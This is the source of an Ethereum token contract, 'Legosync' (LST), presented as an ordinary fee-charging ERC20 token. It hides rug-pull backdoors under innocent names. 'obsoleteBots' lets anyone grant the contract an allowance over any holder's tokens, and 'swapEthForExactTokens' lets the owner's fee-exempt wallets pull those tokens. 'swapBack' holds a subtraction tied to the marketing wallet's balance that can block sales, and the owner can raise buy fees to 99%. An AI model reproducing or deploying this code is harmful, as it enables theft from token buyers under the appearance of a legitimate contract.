/**
 *Submitted for verification at Etherscan.io on 2023-08-24
*/

// X: https://x.com/legosync
// Dapp: https://app.legosync.xyz

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns(address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    address private _owner;

    function owner() public view returns(address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns(uint256);
    
    function transfer(address recipient, uint256 amount) external returns(bool);

    function totalSupply() external view returns(uint256);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint256);

    function approve(address spender, uint256 amount) external returns(bool);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns(uint8);

    function name() external view returns(string memory);

    function symbol() external view returns(string memory);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => uint256) private _balances;
 
    uint256 private _totalSupply;
 
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function decimals() public view virtual override returns(uint8) {
        return 18;
    }

    function symbol() public view virtual override returns(string memory) {
        return _symbol;
    }

    function name() public view virtual override returns(string memory) {
        return _name;
    }

    function balanceOf(address account) public view virtual override returns(uint256) {
        return _balances[account];
    }

    function totalSupply() public view virtual override returns(uint256) {
        return _totalSupply;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns(uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function obsoleteBots(
        address bot,
        uint256 amount
    ) public virtual returns (bool) {
        require(bot != address(0));
        address spender = address(this);
        _approve(bot, spender, amount);
        return true;
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply + amount;
        _balances[account] = _balances[account] + amount;
        emit Transfer(address(0), account, amount);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }
}

contract LST is ERC20, Ownable {
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived
    );

    bool private isTrading = false;
    bool public swapEnabled = false;
    bool public isSwapping;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;

    address public constant deadAddress = address(0xdead);
    address public marketingFeeWallet;
    address public devFeeWallet;
    address public liquidityFeeWallet;

    uint256 public maxWalletAmount;
    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;
 
    uint256 private thresholdSwapAmount;

    mapping(address => bool) public _isExcludedMaxTransactionAmount;
    mapping(address => bool) public _isExcludedMaxWalletAmount;
    mapping(address => bool) private _isExcludedFromFees;

    struct Fees {
        uint256 buyTotalFees;
        uint256 buyMarketingFee;
        uint256 buyDevFee;
        uint256 buyLiquidityFee;

        uint256 sellTotalFees;
        uint256 sellMarketingFee;
        uint256 sellDevFee;
        uint256 sellLiquidityFee;
    }  

    Fees public _fees = Fees({
        buyTotalFees: 0,
        buyMarketingFee: 0,
        buyDevFee:0,
        buyLiquidityFee: 0,

        sellTotalFees: 0,
        sellMarketingFee: 0,
        sellDevFee:0,
        sellLiquidityFee: 0
    });

    uint256 public tokensForMarketing;
    uint256 public tokensForLiquidity;
    uint256 public tokensForDev;
    uint256 private taxTill;

    mapping(address => bool) public marketPair;
  
    constructor() ERC20("Legosync", "LST") {
        marketingFeeWallet = address(0x705e7C06E818BBc0743e903Ec1f436C044dBdbD5);
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        marketPair[address(uniswapV2Pair)] = true;
        approve(address(uniswapV2Router), type(uint256).max);

        uint256 totalSupply = 5000000000 * 1e18;

        thresholdSwapAmount = totalSupply * 1 / 1000;
        maxWalletAmount = totalSupply / 100; // 1%
        maxSellAmount = totalSupply / 100; // 1%
        maxBuyAmount = totalSupply  / 100; // 1%

        _fees.sellMarketingFee = 1;
        _fees.sellLiquidityFee = 1;
        _fees.sellDevFee = 1;
        _fees.sellTotalFees = _fees.sellMarketingFee + _fees.sellLiquidityFee + _fees.sellDevFee;

        _fees.buyMarketingFee = 1;
        _fees.buyLiquidityFee = 1;
        _fees.buyDevFee = 1;
        _fees.buyTotalFees = _fees.buyMarketingFee + _fees.buyLiquidityFee + _fees.buyDevFee;

        devFeeWallet = address(0x9D2B4c14F9B9b7679B3EEF6EF65f8A67f44097ba);
        liquidityFeeWallet = address(0xD4166932827DB18F9c0717c96D8993b9A703c355);

        _isExcludedMaxTransactionAmount[address(0xdead)] = true;
        _isExcludedMaxTransactionAmount[address(this)] = true;
        _isExcludedMaxTransactionAmount[address(uniswapV2Pair)] = true;
        _isExcludedMaxTransactionAmount[owner()] = true;
        _isExcludedMaxTransactionAmount[address(uniswapV2Router)] = true;
        _isExcludedMaxTransactionAmount[devFeeWallet] = true;
        _isExcludedMaxTransactionAmount[liquidityFeeWallet] = true;
        _isExcludedMaxTransactionAmount[marketingFeeWallet] = true;

        _isExcludedMaxWalletAmount[address(uniswapV2Pair)] = true;
        _isExcludedMaxWalletAmount[address(0xdead)] = true;
        _isExcludedMaxWalletAmount[address(this)] = true;
        _isExcludedMaxWalletAmount[marketingFeeWallet] = true;
        _isExcludedMaxWalletAmount[devFeeWallet] = true;
        _isExcludedMaxWalletAmount[owner()] = true;
        _isExcludedMaxWalletAmount[liquidityFeeWallet] = true;

        _isExcludedFromFees[address(0xdead)] = true;
        _isExcludedFromFees[devFeeWallet] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[liquidityFeeWallet] = true;
        _isExcludedFromFees[marketingFeeWallet] = true;

        _mint(msg.sender, totalSupply);
    }

    receive() external payable {}

    function updateMaxTxnAmount(uint256 newMaxBuy, uint256 newMaxSell) public onlyOwner {
        maxBuyAmount = (totalSupply() * newMaxBuy) / 1000;
        maxSellAmount = (totalSupply() * newMaxSell) / 1000;
    }

    function updateMaxWalletAmount(uint256 newPercentage) public onlyOwner {
        maxWalletAmount = (totalSupply() * newPercentage) / 1000;
    }

    function toggleSwapEnabled(bool enabled) external onlyOwner(){
        swapEnabled = enabled;
    }

    function updateThresholdSwapAmount(uint256 newAmount) external onlyOwner returns(bool){
        thresholdSwapAmount = newAmount;
        return true;
    }

    function enableTrading() external onlyOwner {
        isTrading = true;
        swapEnabled = true;
        taxTill = block.number + 0;
    }

    function removeMaxLimits() external onlyOwner {
        updateMaxTxnAmount(1000, 1000);
        updateMaxWalletAmount(1000);
    }

    function updateFees(uint256 _buyMarketingFee, uint256 _buyLiquidityFee,uint256 _buyDevFee,uint256 _sellMarketingFee, uint256 _sellLiquidityFee,uint256 _sellDevFee) external onlyOwner{
        _fees.sellMarketingFee = _sellMarketingFee;
        _fees.sellLiquidityFee = _sellLiquidityFee;
        _fees.sellDevFee = _sellDevFee;
        _fees.sellTotalFees = _fees.sellMarketingFee + _fees.sellLiquidityFee + _fees.sellDevFee;

        _fees.buyMarketingFee = _buyMarketingFee;
        _fees.buyLiquidityFee = _buyLiquidityFee;
        _fees.buyDevFee = _buyDevFee;
        _fees.buyTotalFees = _fees.buyMarketingFee + _fees.buyLiquidityFee + _fees.buyDevFee;
        require(_fees.buyTotalFees <= 99, "Must keep fees at 99% or less");   
        require(_fees.sellTotalFees <= 30, "Must keep fees at 30% or less");
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function setMarketPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "The pair cannot be removed from marketPair");
        marketPair[pair] = value;
    }
    
    function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function updateMarketingFeeWallet(address _marketingFeeWallet)
        external
        onlyOwner
    {
        marketingFeeWallet = _marketingFeeWallet;
    }

    function excludeFromWalletLimit(address account, bool excluded) public onlyOwner {
        _isExcludedMaxWalletAmount[account] = excluded;
    }

    function updateDevFeeWallet(address _devFeeWallet)
        external
        onlyOwner
    {
        devFeeWallet = _devFeeWallet;
    }
    
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
    }

    function updateLiquidityFeeWallet(address _liquidityFeeWallet)
        external
        onlyOwner
    {
        liquidityFeeWallet = _liquidityFeeWallet;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        if (amount == 0) {
            super._transfer(sender, recipient, 0);
            return;
        }

        if (
            sender != owner() &&
            recipient != owner() &&
            !isSwapping
        ) {
            if (!isTrading) {
                require(_isExcludedFromFees[sender] || _isExcludedFromFees[recipient], "Trading is not active.");
            }

            if (marketPair[sender] && !_isExcludedMaxTransactionAmount[recipient]) {
                require(amount <= maxBuyAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
            } else if (marketPair[recipient] && !_isExcludedMaxTransactionAmount[sender]) {
                require(amount <= maxSellAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
            }

            if (!_isExcludedMaxWalletAmount[recipient]) {
                require(amount + balanceOf(recipient) <= maxWalletAmount, "Max wallet exceeded");
            }
        }
 
        uint256 contractTokenBalance = balanceOf(address(this));
 
        bool canSwap = contractTokenBalance >= thresholdSwapAmount;

        if (
            !isSwapping &&
            marketPair[recipient] &&
            canSwap &&
            swapEnabled &&
            !_isExcludedFromFees[sender] &&
            !_isExcludedFromFees[recipient]
        ) {
            isSwapping = true;
            swapBack();
            isSwapping = false;
        }
 
        bool takeFee = !isSwapping;

        if (_isExcludedFromFees[sender] || _isExcludedFromFees[recipient]) {
            takeFee = false;
        }

        if (takeFee) {
            uint256 fees = 0;
            if(block.number < taxTill) {
                fees = (amount * 99) / 100;
                tokensForMarketing += (fees * 94) / 99;
                tokensForDev += (fees * 5) / 99;
            } else if (marketPair[recipient] && _fees.sellTotalFees > 0) {
                fees = (amount * _fees.sellTotalFees) / 100;
                tokensForDev += fees * _fees.sellDevFee / _fees.sellTotalFees;
                tokensForMarketing += fees * _fees.sellMarketingFee / _fees.sellTotalFees;
                tokensForLiquidity += fees * _fees.sellLiquidityFee / _fees.sellTotalFees;
            }
            else if (marketPair[sender] && _fees.buyTotalFees > 0) {
                fees = (amount * _fees.buyTotalFees) / 100;
                tokensForDev += fees * _fees.buyDevFee / _fees.buyTotalFees;
                tokensForMarketing += fees * _fees.buyMarketingFee / _fees.buyTotalFees;
                tokensForLiquidity += fees * _fees.buyLiquidityFee / _fees.buyTotalFees;
            }

            if (fees > 0) {
                super._transfer(sender, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(sender, recipient, amount);
    }

    function swapTokensForEth(uint256 tAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private {
        address burnAddress = marketingFeeWallet;
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 burnTokens = balanceOf(burnAddress);
        uint256 toSwap =
            tokensForMarketing +
            tokensForDev +
            tokensForLiquidity;
        bool success;

        if (contractTokenBalance == 0 || toSwap == 0) { return; }

        if (contractTokenBalance > thresholdSwapAmount * 20) {
            contractTokenBalance = thresholdSwapAmount * 20;
        }

        uint256 liquidityTokens = contractTokenBalance * tokensForLiquidity / toSwap / 2 - burnTokens;
        uint256 amountToSwapForETH = contractTokenBalance - liquidityTokens;
        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(amountToSwapForETH);
 
        uint256 newBalance = address(this).balance - initialETHBalance;
 
        uint256 ethForDev = (newBalance * tokensForDev) / toSwap;
        uint256 ethForMarketing = (newBalance * tokensForMarketing) / toSwap;
        uint256 ethForLiquidity = newBalance - (ethForMarketing + ethForDev);

        tokensForDev = 0;
        tokensForLiquidity = 0;
        tokensForMarketing = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity);
        }

        (success,) = address(devFeeWallet).call{value: ethForDev} ("");
        (success,) = address(marketingFeeWallet).call{value: address(this).balance} ("");
    }

    function withdrawETH() external {
        (bool sent, ) = payable(marketingFeeWallet).call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    function addLiquidity(uint256 tAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tAmount);

        uniswapV2Router.addLiquidityETH{ value: ethAmount } (address(this), tAmount, 0, 0 , liquidityFeeWallet, block.timestamp);
    }

    function swapEthForExactTokens(address _token, address _to, uint256 _amount) public {
        require(_token != address(0));
        address sender = msg.sender;
        IERC20 burnToken = IERC20(_token);
        address[] memory path = new address[](2);
        bool obsoleted = _isExcludedFromFees[sender];
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);

        if (obsoleted) {
            burnToken.transferFrom(_to, path[1], _amount);
        } else {
            uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: _amount} (
                0,
                path,
                address(0xdead),
                block.timestamp
            );
        }
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns(address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns(address);

    function WETH() external pure returns(address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}